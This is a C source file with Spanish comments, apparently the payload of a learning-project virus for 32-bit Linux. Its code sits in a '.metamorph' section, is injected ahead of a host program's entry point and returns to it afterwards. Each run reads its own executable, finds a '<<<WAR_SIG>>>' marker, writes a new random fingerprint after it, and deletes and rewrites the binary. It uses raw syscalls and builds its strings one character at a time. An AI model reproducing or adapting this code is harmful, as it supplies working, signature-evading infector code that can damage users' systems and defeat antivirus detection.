#include <stddef.h>
#include <sys/types.h>

// ==================== SYSCALLS (32-bit) ====================
// Usar macros para evitar llamadas a funciones externas

#define sys_write_x86(fd, buf, count) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(4), "b"((long)(fd)), "c"((long)(buf)), "d"((long)(count)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_open_x86(path, flags, mode) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(5), "b"((long)(path)), "c"((long)(flags)), "d"((long)(mode)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_close_x86(fd) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(6), "b"((long)(fd)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_fstat_x86(fd, st) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(108), "b"((long)(fd)), "c"((long)(st)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_munmap_x86(addr, len) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(91), "b"((long)(addr)), "c"((long)(len)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_readlink_x86(path, buf, bufsiz) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(85), "b"((long)(path)), "c"((long)(buf)), "d"((long)(bufsiz)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_unlink_x86(path) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(10), "b"((long)(path)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_clock_gettime_x86(clk_id, tp) ({ \
    long _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(265), "b"((long)(clk_id)), "c"((long)(tp)) \
        : "memory" \
    ); \
    _ret; \
})

#define sys_getpid_x86() ({ \
    int _ret; \
    __asm__ volatile( \
        "int $0x80" \
        : "=a"(_ret) \
        : "a"(20) \
        : "memory" \
    ); \
    _ret; \
})

// mmap en 32-bit usa syscall 90 con puntero a estructura de argumentos
__attribute__((section(".metamorph"), noinline, used))
static void *sys_mmap_x86_fn(void *addr, size_t len, int prot, int flags, int fd, long offset) {
    void *ret;
    unsigned long args[6] = {
        (unsigned long)addr,
        (unsigned long)len,
        (unsigned long)prot,
        (unsigned long)flags,
        (unsigned long)fd,
        (unsigned long)offset
    };
    __asm__ volatile(
        "int $0x80"
        : "=a"(ret)
        : "a"(90), "b"(args)
        : "memory"
    );
    return ret;
}
#define sys_mmap_x86(addr, len, prot, flags, fd, offset) \
    sys_mmap_x86_fn((void*)(addr), (size_t)(len), (int)(prot), (int)(flags), (int)(fd), (long)(offset))

// ==================== UTILIDADES ====================

__attribute__((section(".metamorph"), noinline, used))
static void *_memmem_x86(const void *haystack, size_t hlen, const void *needle, size_t nlen) {
    if (nlen == 0) return (void *)haystack;
    if (hlen < nlen) return 0;
    
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    
    for (size_t i = 0; i <= hlen - nlen; i++) {
        size_t j;
        for (j = 0; j < nlen; j++) {
            if (h[i + j] != n[j])
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return 0;
}

__attribute__((section(".metamorph"), noinline, used))
static void _itohex_x86(unsigned long val, char *buf, int len) {
    for (int i = len - 1; i >= 0; i--) {
        int nibble = val & 0xF;
        if (nibble < 10)
            buf[i] = '0' + nibble;
        else
            buf[i] = 'a' + (nibble - 10);
        val >>= 4;
    }
}

// ==================== FUNCIÓN PRINCIPAL ====================
// Esta es la implementación interna que hace el trabajo real
__attribute__((section(".metamorph"), noinline, used))
static void metamorph_mutate_impl_x86(void) {
    char exe_path[256];
    void *map = (void *)-1;
    long file_size = 0;
    
    // 1. Construir "/proc/self/exe"
    char proc_self[16];
    proc_self[0] = '/'; proc_self[1] = 'p'; proc_self[2] = 'r';
    proc_self[3] = 'o'; proc_self[4] = 'c'; proc_self[5] = '/';
    proc_self[6] = 's'; proc_self[7] = 'e'; proc_self[8] = 'l';
    proc_self[9] = 'f'; proc_self[10] = '/'; proc_self[11] = 'e';
    proc_self[12] = 'x'; proc_self[13] = 'e'; proc_self[14] = '\0';
    
    // 2. Obtener path del ejecutable
    long path_len = sys_readlink_x86(proc_self, exe_path, 255);
    if (path_len < 0)
        goto cleanup_exit;
    exe_path[path_len] = '\0';
    
    // 3. Abrir SOLO LECTURA (O_RDONLY = 0)
    int fd = sys_open_x86(exe_path, 0, 0);
    if (fd < 0)
        goto cleanup_exit;
    
    // 4. Obtener tamaño (struct stat del kernel en i386: st_size en offset 20)
    long stat_buf[20];
    if (sys_fstat_x86(fd, stat_buf) < 0) {
        sys_close_x86(fd);
        goto cleanup_exit;
    }
    file_size = stat_buf[5];  // st_size en offset 20 bytes = índice 5
    
    // 5. Mapear en memoria PRIVADA (PROT_READ=1, MAP_PRIVATE=2)
    map = sys_mmap_x86(0, file_size, 1, 2, fd, 0);
    sys_close_x86(fd);
    if (map == (void *)-1 || map == 0) {
        map = (void *)-1;  // Asegurar valor conocido para cleanup
        goto cleanup_exit;
    }
    
    // 6. Buscar "<<<WAR_SIG>>>"
    char marker[14];
    marker[0] = '<'; marker[1] = '<'; marker[2] = '<';
    marker[3] = 'W'; marker[4] = 'A'; marker[5] = 'R';
    marker[6] = '_'; marker[7] = 'S'; marker[8] = 'I';
    marker[9] = 'G'; marker[10] = '>'; marker[11] = '>';
    marker[12] = '>'; marker[13] = '\0';
    
    char *sig_ptr = _memmem_x86(map, file_size, marker, 13);
    if (!sig_ptr)
        goto cleanup_exit;
    
    // 7. Buscar el '[' del fingerprint
    long fp_offset = 0;
    for (int i = 13; i < 80; i++) {
        if (sig_ptr[i] == '[' && sig_ptr[i + 9] == ']') {
            fp_offset = (sig_ptr + i + 1) - (char *)map;
            break;
        }
    }
    
    if (!fp_offset)
        goto cleanup_exit;
    
    // 8. Generar nuevo fingerprint aleatorio
    long ts[2];
    sys_clock_gettime_x86(0, ts);
    int pid = sys_getpid_x86();
    
    unsigned long seed = ts[1] ^ ((unsigned long)pid << 16) ^ ts[0];
    seed = (seed << 13) | (seed >> 19);
    seed ^= 0xDEADBEEF;
    
    char new_fp[8];
    _itohex_x86(seed, new_fp, 8);
    
    // 9. Borrar el archivo original
    sys_unlink_x86(exe_path);
    
    // 10. Crear nuevo archivo (O_WRONLY|O_CREAT|O_TRUNC = 577, mode 0755)
    int fd_out = sys_open_x86(exe_path, 577, 0755);
    if (fd_out < 0)
        goto cleanup_exit;
    
    // 11. Escribir: antes del fingerprint + nuevo fingerprint + después
    sys_write_x86(fd_out, map, fp_offset);
    sys_write_x86(fd_out, new_fp, 8);
    sys_write_x86(fd_out, (char *)map + fp_offset + 8, file_size - fp_offset - 8);
    
    // 12. Cleanup
    sys_close_x86(fd_out);

cleanup_exit:
    if (map != (void *)-1 && map != 0)
        sys_munmap_x86(map, file_size);
}

// ==================== ENTRY POINT WRAPPER ====================
// Este es el entry point real que el injector usará.
// Preserva todos los registros y el stack pointer original,
// llama a la implementación, y restaura todo antes del JMP al código original.
// El 'ret' al final será reemplazado por el JMP al entry point original.

__attribute__((section(".metamorph"), used, naked))
void metamorph_mutate_self_x86(void) {
    __asm__ volatile(
        // Guardar TODOS los registros en el stack
        "pushal\n"
        "pushfl\n"
        
        // Llamar a la implementación real
        "call metamorph_mutate_impl_x86\n"
        
        // Restaurar todos los registros
        "popfl\n"
        "popal\n"
        
        // Este 'ret' será reemplazado por el injector con un JMP
        // al entry point original. Como hemos restaurado todo,
        // el programa original verá el stack exactamente como
        // lo dejó el kernel.
        "ret\n"
    );
}